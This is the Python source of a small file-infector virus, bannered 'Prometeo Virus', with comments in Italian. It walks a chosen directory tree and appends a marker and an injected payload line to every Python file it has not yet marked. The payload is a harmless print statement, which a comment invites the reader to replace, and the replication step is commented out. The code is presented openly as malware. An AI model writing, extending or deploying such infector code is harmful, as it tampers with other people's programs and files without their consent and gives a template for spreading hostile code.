
# Importazioni necessarie

import os, sys, shutil, random, glob

viruskey = "#! My Virus Key: 1x2y3z"
infettato = "No"
banner = """
+-----------------+----------------+
| Prometeo Virus | Coded by Godlik |
+----------------+-----------------+
| Versione: 1.1  | Data: 8/1/2017  |
+----------------+-----------------+
	  """
myself = sys.argv[0]

#1 indentificazione

def identificazione():
	infettato = "No"
	_path_ = os.getcwd() # ottengo la directory corrente
	for path, directory, files in os.walk(_path_): # ottengo tutte le directory, sottodirectory e files prsenti nella path
		#print(files)
		for file in files:
			_file_, punto, estensione = file.partition('.') # Suddivide il file in tre parti separate dal punto, se dopo il punto 
			if estensione == "py": # vi è py (estensione file python) il il file e' infettabile
				#print(file)
				try:
					fileopen = open(file, 'r') # Apri il file per leggerlo
					for line in fileopen: # Analizzo le righe			
						if line == viruskey: #Se non trovi la key del virus il file non e' infetto
							infettato = "Si"
							break
						else: # Se no e' infetto
							pass
					if infettato == "No": # Avvia infezione del file non infetto
						print("[+] Infetto il file... " + file)
						infezione(file)
					elif infettato == "Si":
						print("[*] File gia' infettato! " + file + " KEY: " + str(viruskey))
				except FileNotFoundError:
					pass
			else:
				pass

#2 Infezione

#exploit = """"""
def infezione(file):
	exploitstatus = "No" # Stato dell'Exploit negativo (vuol dire che non e' stato ancora iniettato)
	exploit = 'print("Exploited")' # Questo è l'Exploit, e' possibile cambiarlo con altri
	print("[*] Preparo l'Exploit...")
	try:
		file = open(file, 'a') # Apro il file
		file.write("\n" + viruskey + "\n" + exploit) # Inietto l'exploit nel file vittima
		exploitstatus = "Si" # Stato dell' exploit positivo (exploit iniettato)
		file.close() # Chiudo il file
	except FileNotFoundError:
		pass
	if exploitstatus == "Si": # Se l'exploit è stato iniettato procendi con la Replicazione
		print("[+] Infezione Riuscita")
		#replicazione(file)
	else:
		pass


if __name__ == '__main__':
	print(banner)
	try:
		directory = input("Path >> ")
		os.chdir(directory)
	except FileNotFoundError :
		print("[!] Path non Trovata")
		exit
	identificazione()
